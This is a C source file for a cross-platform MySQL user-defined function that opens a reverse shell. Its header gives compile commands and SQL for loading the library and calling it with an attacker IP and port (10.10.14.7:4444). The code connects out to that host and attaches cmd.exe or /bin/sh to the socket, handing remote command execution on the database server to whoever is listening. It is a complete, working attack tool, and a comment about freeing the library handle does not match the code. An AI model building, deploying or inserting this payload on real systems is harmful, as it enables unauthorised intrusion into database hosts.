/*
 * MySQL UDF reverse shell (cross-platform)
 *
 * Based on: Obrela Labs, "Using UDF in Penetration Testing Part 2"
 *           https://www.obrela.com/resources/advisories/using-udf-in-penetration-testing-part-2
 *
 * Usage (after loading the shared library into the MySQL plugin dir):
 *   CREATE FUNCTION reverseShell_udf RETURNS INTEGER SONAME 'reverseShell_udf.dll';
 *   SELECT reverseShell_udf('10.10.14.7','4444');
 *
 * Windows 32/64 : x86_64-w64-mingw32-gcc -shared -o reverseShell_udf.dll reverseShell_udf.c -lws2_32
 *                 i686-w64-mingw32-gcc   -shared -o reverseShell_udf.dll reverseShell_udf.c -lws2_32
 * Linux   32/64 : gcc -shared -fPIC -o reverseShell_udf.so reverseShell_udf.c
 *                 (add -m32 / -m64 as needed, requires gcc-multilib for 32-bit)
 *
 * For penetration testing / lab use only.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
  #include <winsock2.h>
  #include <windows.h>
  #pragma comment(lib, "Ws2_32.lib")
  #define DLLEXP __declspec(dllexport)
#else
  #include <sys/types.h>
  #include <sys/socket.h>
  #include <netinet/in.h>
  #include <arpa/inet.h>
  #include <unistd.h>
  #define DLLEXP
#endif

/* ---- Minimal MySQL UDF ABI (avoids needing mysql.h at build time) ---- */

typedef char my_bool;

enum Item_result {
  STRING_RESULT = 0,
  REAL_RESULT,
  INT_RESULT,
  ROW_RESULT,
  DECIMAL_RESULT
};

typedef struct st_udf_args {
  unsigned int      arg_count;   /* number of arguments */
  enum Item_result *arg_type;    /* pointer to item_results */
  char            **args;        /* pointer to argument */
  unsigned long    *lengths;     /* length of string arguments */
  char             *maybe_null;  /* Set to 1 for all maybe_null args */
  char            **attributes;
  unsigned long    *attribute_lengths;
  void             *extension;
} UDF_ARGS;

typedef struct st_udf_init {
  my_bool        maybe_null;  /* 1 if function can return NULL */
  unsigned int   decimals;    /* for real functions */
  unsigned long  max_length;  /* For string functions */
  char          *ptr;         /* free pointer for function data */
  my_bool        const_item;  /* 0 if result depends on arguments */
  void          *extension;
} UDF_INIT;

/* ---- Freestanding Windows build (no C runtime) ----
 * Compile with -DUDF_MINIMAL -nostdlib -fno-builtin.  The library then
 * depends only on KERNEL32.dll and WS2_32.dll (no UCRT / libgcc / libwinpthread). */
#if defined(_WIN32) && defined(UDF_MINIMAL)
void *memset(void *s, int c, size_t n) { unsigned char *p = (unsigned char *)s; while (n--) *p++ = (unsigned char)c; return s; }
void *memcpy(void *d, const void *s, size_t n) { unsigned char *a = (unsigned char *)d; const unsigned char *b = (const unsigned char *)s; while (n--) *a++ = *b++; return d; }
char *strcpy(char *d, const char *s) { char *r = d; while ((*d++ = *s++)) { } return r; }
int   atoi(const char *s) { int r = 0, neg = 0; while (*s == ' ') s++; if (*s == '-') { neg = 1; s++; } while (*s >= '0' && *s <= '9') r = r * 10 + (*s++ - '0'); return neg ? -r : r; }
BOOL APIENTRY DllMain(HINSTANCE h, DWORD reason, LPVOID reserved) { (void)h; (void)reason; (void)reserved; return TRUE; }
#endif

/* ---- Exported entry points ---- */

#ifdef __cplusplus
extern "C" {
#endif

DLLEXP my_bool reverseShell_udf_init(UDF_INIT *initid, UDF_ARGS *args, char *message);
DLLEXP long long reverseShell_udf(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error);

#ifdef __cplusplus
}
#endif

DLLEXP my_bool reverseShell_udf_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
{
  (void)initid;
  if (args->arg_count != 2) {
    strcpy(message, "reverseShell_udf() usage: select reverseShell_udf('ip','port')");
    return 1;
  }
  if (args->arg_type[0] != STRING_RESULT || args->arg_type[1] != STRING_RESULT) {
    strcpy(message, "reverseShell_udf() requires a valid ip and port");
    return 1;
  }
  return 0;
}

DLLEXP long long reverseShell_udf(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
{
  (void)initid; (void)is_null; (void)error;

  if (args->arg_count != 2 || !args->args[0] || !args->args[1])
    return 0;

#ifdef _WIN32
  {
    u_short  uPort    = (u_short)atoi(args->args[1]);
    char    *cAddress = args->args[0];
    WSADATA  wsaData  = {0};
    WORD     wsaVer   = MAKEWORD(2, 2);
    SOCKET   sock;
    struct sockaddr_in sin;
    char     cmd[]    = "cmd.exe";
    STARTUPINFO        si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&sin, sizeof(sin));
    ZeroMemory(&si,  sizeof(si));
    ZeroMemory(&pi,  sizeof(pi));

    WSAStartup(wsaVer, &wsaData);

    sock = WSASocket(PF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    sin.sin_family      = AF_INET;
    sin.sin_port        = htons(uPort);
    sin.sin_addr.s_addr = inet_addr(cAddress);

    if (connect(sock, (struct sockaddr *)&sin, sizeof(sin)) == SOCKET_ERROR) {
      closesocket(sock);
      WSACleanup();
      return 0;
    }

    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESTDHANDLES;
    si.hStdInput   = si.hStdOutput = si.hStdError = (HANDLE)sock;

    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
  }
#else
  {
    int fd;
    struct sockaddr_in sin;

    fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0)
      return 0;

    memset(&sin, 0, sizeof(sin));
    sin.sin_family      = AF_INET;
    sin.sin_port        = htons((unsigned short)atoi(args->args[1]));
    sin.sin_addr.s_addr = inet_addr(args->args[0]);

    if (connect(fd, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
      close(fd);
      return 0;
    }

    dup2(fd, 0);
    dup2(fd, 1);
    dup2(fd, 2);

    /* Free the MySQL library handle first so the loader does not deadlock
       while the plugin is being re-entered from the new shell. */
    execl("/bin/sh", "sh", (char *)NULL);

    /* If exec failed, drop the socket and return. */
    close(fd);
  }
#endif

  return 0;
}
